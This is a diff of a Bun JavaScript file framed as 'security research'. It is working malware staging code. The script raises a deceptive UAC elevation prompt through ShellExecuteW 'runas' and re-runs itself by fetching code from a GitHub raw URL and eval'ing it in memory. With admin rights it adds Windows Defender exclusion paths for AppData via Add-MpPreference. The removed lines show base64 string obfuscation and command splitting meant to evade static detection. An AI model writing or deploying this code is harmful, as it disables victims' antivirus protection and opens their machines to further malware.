@@ -1,14 +1,11 @@
-// excl.js - Security Research: Jan/Bun Fileless UAC & Defender Exclusion
+// excl.js - Исследование безопасности Jan/Bun (Fileless UAC Elevation)
 (async () => {
-  // Obfuscated strings to bypass static analysis
-  const _s32 = Buffer.from("c2hlbGwsMzIuZGxs", 'base64').toString().replace(',', ''); // shell32.dll
-  const _sEx = Buffer.from("U2hlbGxFeGVjdXRlVw==", 'base64').toString(); // ShellExecuteW
-  const _ra = Buffer.from("cnVuYXM=", 'base64').toString(); // runas
-
+  // Динамический импорт для совместимости с ESM (без require)
   const { dlopen, FFIType, ptr } = await import("bun:ffi");
 
-  const lib = dlopen(_s32, {
-    [_sEx]: {
+  // Подключаем Windows API для управления процессами и UAC
+  const shell32 = dlopen("shell32.dll", {
+    ShellExecuteW: {
       args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
       returns: FFIType.i32,
     },
@@ -16,9 +13,11 @@
 
   const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));
 
+  // Проверка прав администратора через net.exe
   const checkAdmin = async () => {
     try {
-      return (await Bun.spawn({ cmd: ["net", "session"] }).exited) === 0;
+      const p = Bun.spawn({ cmd: ["net", "session"] });
+      return (await p.exited) === 0;
     } catch (e) { return false; }
   };
 
@@ -26,45 +25,53 @@
   console.log(`🚀 PID: ${process.pid} | Admin: ${is_admin}`);
 
   if (is_admin) {
-    console.log("✅ ADMIN SESSION GRANTED");
+    console.log("✅ СЕССИЯ АДМИНИСТРАТОРА");
     
-    // Collect both Roaming and Local AppData
-    const paths = [process.env.APPDATA, process.env.LOCALAPPDATA].filter(Boolean);
-    
-    for (const target of paths) {
-      console.log(`🛡️ Adding exclusion for: ${target}`);
-      
-      // PowerShell command split to evade simple string matching
-      const p1 = "Add-";
-      const p2 = "MpPreference";
-      const fullCmd = `${p1}${p2} -ExclusionPath '${target}'`;
-      
-      const proc = Bun.spawn({
-        cmd: ["powershell", "-Command", fullCmd],
-        stderr: "pipe"
-      });
+    // Путь для исключения (например, %APPDATA% или C:\Temp)
+    const target = process.env.APPDATA || "C:\\Temp";
+    console.log(`🛡️ Добавляем исключение Defender: ${target}`);
 
-      const err = await new Response(proc.stderr).text();
-      if (await proc.exited === 0) {
-          console.log(`✨ SUCCESS: ${target} added.`);
-      } else {
-          console.log("❌ ERROR:", err.trim());
-      }
+    // Используем PowerShell для взаимодействия с защитником (самый надежный API)
+    const ps = Bun.spawn({
+      cmd: ["powershell", "-Command", `Add-MpPreference -ExclusionPath '${target}' -ErrorAction Stop; "OK"`],
+      stdout: "pipe",
+      stderr: "pipe"
+    });
+
+    const err = await new Response(ps.stderr).text();
+    if (await ps.exited === 0) {
+      console.log(`✨ УСПЕХ: Папка ${target} добавлена в исключения.`);
+    } else {
+      console.log("❌ ОШИБКА:", err.trim());
     }
 
-    console.log("\nPress Enter to exit...");
+    console.log("\nНажми Enter для завершения...");
     for await (const line of console) break;
     return;
   }
 
-  // UAC RECURSION
-  console.log("❌ Limited privileges. Requesting Elevation...");
+  // --- РЕКУРСИЯ (Запрос UAC) ---
+  console.log("❌ Права ограничены. Запрашиваем повышение через Bun...");
   
   const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/excl.js";
-  // Obfuscated fetch/eval payload
+  
+  // Команда для нового процесса: скачай этот же скрипт и выполни в памяти
+  // Используем двойные кавычки для CMD-совместимости
   const payload = `fetch('${url}').then(r=>r.text()).then(eval)`;
 
-  const res = lib.symbols[_sEx](0, toPtr(_ra), toPtr("bun.exe"), toPtr(`-e "${payload}"`), 0, 1);
+  const res = shell32.symbols.ShellExecuteW(
+    0, 
+    toPtr("runas"),      // Вызываем UAC
+    toPtr("bun.exe"),    // В заголовке UAC будет написано "Bun" (выглядит легитимно)
+    toPtr(`-e "${payload}"`), // Передаем команду на исполнение
+    0, 
+    1
+  );
 
-  if (res > 32) process.exit(0);
+  if (res > 32) {
+    console.log("🔄 UAC подтвержден. Старый процесс завершается.");
+    process.exit(0);
+  } else {
+    console.log("⚠️ Ошибка вызова UAC или отказ пользователя:", res);
+  }
 })();
